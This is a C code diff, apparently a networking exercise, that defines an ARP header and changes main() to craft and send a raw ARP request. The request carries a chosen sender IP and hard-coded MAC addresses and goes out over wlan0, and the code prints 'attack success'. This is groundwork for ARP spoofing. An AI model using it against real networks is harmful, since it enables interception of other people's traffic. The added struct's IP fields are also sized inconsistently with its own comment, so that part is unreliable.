@@ -74,6 +74,19 @@ typedef struct _MAC_FRAME_TAIL
 	unsigned int m_sCheckSum;	//数据帧尾校验和
 }__attribute__((packed))MAC_FRAME_TAIL, *PMAC_FRAME_TAIL;
 
+/* ARP头定义，共28个字节 */
+typedef struct _ARPHDR    
+{
+	short    ar_hrd;                //    硬件地址类型，以太网中为ARPHRD_ETHER
+	short    ar_pro;                //  协议地址类型，ETHERTYPE_IP
+	char    ar_hln;                //    硬件地址长度，MAC地址的长度为6
+	char    ar_pln;                //    协议地址长度，IP地址的长度为4
+	short    ar_op;                //    ARP操作代码，ARPOP_REQUEST为请求，ARPOP_REPLY为响应
+	char    ar_sha[ETH_ALEN];    //    源MAC地址
+	long    ar_sip;                //    源IP地址
+	char    ar_tha[ETH_ALEN];    //    目的MAC地址
+	long    ar_tip;                //    目的IP地址
+}__attribute__((packed)) ARPHDR, *PARPHDR;
 /*
  * IP头定义，共20个字节
  *-- 版本 —— 
@@ -234,13 +247,16 @@ void mac_to_char(char *mac,unsigned char *str){
 /* 主函数 */
 int main(int argc,char *argv[])
 {
-	printf("HelloWorld!\n");
+	//printf("HelloWorld!\n");
 
-	MAC_FRAME_HEADER header;
+	/* create the ether header 1.0 */
 
 	char dstMacAddress[] = "a8:15:4d:1f:7d:68";
 
 	char srcMacAddress[] = "c8:bc:c8:92:3e:05";
+
+	/*
+	MAC_FRAME_HEADER header;
 
 	mac_to_char(dstMacAddress,header.m_cDstMacAddress);
 
@@ -259,12 +275,109 @@ int main(int argc,char *argv[])
 	MAC_FRAME_TAIL tail;
 
 	tail.m_sCheckSum = 0;
-
+	
 	printf("MAC_FRAME_TAIL m_sCheckSum = %u \n",tail.m_sCheckSum);
-
+	
 	if(argc > 1)
 	{
 		printf("i=%s \n",argv[1]);
+	}
+	*/
+	/* Create the ether header 2.0 */
+
+	struct ether_header eth_hdr;
+	
+	memset(&eth_hdr, 0,sizeof(struct ether_header));
+
+	mac_to_char(dstMacAddress,eth_hdr.ether_dhost);
+
+	mac_to_char(srcMacAddress,eth_hdr.ether_shost);
+
+	eth_hdr.ether_type = htons(ETHERTYPE_ARP);
+
+	printf("ether_type : %02X \n", eth_hdr.ether_type);
+
+	/* Create the arp packet */
+	
+	struct ether_arp arp;
+
+	memset(&arp, 0, sizeof(struct ether_arp));
+
+	arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
+
+	arp.ea_hdr.ar_pro = htons(0x0800);
+
+	arp.ea_hdr.ar_hln = 6;
+
+	arp.ea_hdr.ar_pln = 4;
+
+	arp.ea_hdr.ar_op = htons(ARPOP_REQUEST);
+
+	/* create socket */
+
+	int fd;
+
+	fd = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP));
+
+	if(fd < 0){
+		perror("socket open error!\n");
+		exit(EXIT_FAILURE);
+	}else{
+		printf("socket open success!\n");
+	}
+	
+	struct sockaddr sa;
+
+	memset(&sa, 0, sizeof(struct sockaddr));
+
+	strcpy(sa.sa_data,"wlan0");
+
+	char buf[60];
+
+	int hdr_len = sizeof(struct ether_header);
+
+	int result;
+	
+	/* in address struct */
+
+	char *src_ip_addr = "192.168.0.1";
+
+	char *trc_ip_addr = "192.168.188.1";
+
+	struct in_addr src_addr,trc_addr;
+
+	memset(&src_addr, 0,sizeof(struct in_addr));
+
+	inet_aton(src_ip_addr, &src_addr);
+
+	memset(&trc_addr, 0,sizeof(struct in_addr));
+
+	inet_aton(trc_ip_addr, &trc_addr);
+	
+	/* set arp packet data */
+
+	memcpy((void *) arp.arp_sha,(void *) eth_hdr.ether_shost, 6);
+
+	memcpy((void *) arp.arp_spa,(void *) &src_addr, 4);
+
+	memset(arp.arp_tha, 0, 6);
+
+	memcpy((void *) arp.arp_tpa,(void *) &trc_addr, 4);
+
+	memcpy(buf, &eth_hdr, hdr_len);
+
+	memcpy(&buf[hdr_len], &arp, sizeof(struct ether_arp));
+
+	result = sendto(fd, buf, sizeof(buf), 0, &sa, sizeof(sa));
+
+	printf("attack %s\n!!\n", trc_ip_addr);
+	
+	printf("Sendto func result: %d \n",result);
+	
+	if(result < 0){
+		printf("attack failure: %d \n",errno);
+	}else{
+		printf("attack success \n");
 	}
 	/**
 	 * in_addr IPv4地址结构体
